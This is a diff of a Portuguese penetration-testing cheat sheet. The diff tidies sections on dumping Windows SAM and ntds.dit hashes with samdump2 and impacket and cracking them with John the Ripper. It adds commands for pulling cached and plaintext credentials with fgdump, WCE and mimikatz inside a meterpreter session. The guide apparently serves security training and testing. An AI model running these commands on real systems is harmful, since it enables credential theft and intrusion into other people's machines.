@@ -82,28 +82,45 @@ Agora definimos o payload com ``set payload windows/x64/meterpreter/reverse_tcp`
 
 Execute o comando ``exploit`` e aguarde o inicio de uma nova sessão com os privilégios de administrador.
 
-## Visualizar Hashes
-
+## Visualizar Hashes  
 Para visualizar os hashes que estão nos arquivos sam e ntds.dit utilize uma das opções:
 
-**Windows 2k/NT/XP/Vista**
-
+**Windows 2k/NT/XP/Vista**  
 ``samdump2 SYSTEM SAM``
 
-**Windows 2k/NT/XP/Vista/7/8/10/Server**
-
+**Windows 2k/NT/XP/Vista/7/8/10/Server**  
 ``impacket-secretdump -sam SAM -system SYSTEM LOCAL``
 
-**Windows Server**
-
+**Windows Server**  
 ``impacket-secretdump -ntds ntds.dit -system SYSTEM LOCAL``
 
-## Quebra de Hashes
-
+## Quebra de Hashes  
 Para realizar a quebra dos hashes podemos utilizar a ferramenta john The Ripper.
 
-**Quebra de Hash sem LM** *(aad3b435b51404eeaad3b435b51404ee)***:**
+**Quebra de Hash sem LM** *(aad3b435b51404eeaad3b435b51404ee)***:**  
 ``jhon --format=nt hash``
 
-**Quebra de Hash com LM:**
+**Quebra de Hash com LM:**  
 ``jhon --format=lm hash``
+
+## Obtendo hashes de senhas do Windows em cache
+
+Para recuperar hashes de senhas que estão armazenadas no cache ou na memória do Windows, utilize aguns dos utilitários abaixo:
+
+**fgdump**  
+*Download: /usr/share/windows-binaries/fgdumb/fgdumb.exe (Kali)*  
+Executar na máquina alvo, irá retornar dois arquivos com os hashes das senhas locais e do AD.
+
+**WCE Universal** 
+*Download: /usr/share/windows-resources/wce/wce-universal.exe (Kali)*  
+O utilitário wce-universal.exe possui diversas formas de ser executado, duas delas são a mais simples que é sem argumentos, `wce-universal.exe`, onde irá retornar os hashes armazenados no cache e a outra forma é com o argumento -w  `wce-universal.exe -w` que retorna a senha em texto claro.
+
+**Meterpreter**  
+Com a sessão iniciada no meterpreter, carregue o módulo mimikatz com `load mimikatz` e utilize uma das variações abaixo:  
+  
+- `wdigest`
+- `mimikatz_command -f sekurlsa::wdigest -a full`
+- `mimikatz_command -f sekurlsa::searchPasswords`
+- `mimikatz_command -f sekurlsa::logonPasswords`
+
+
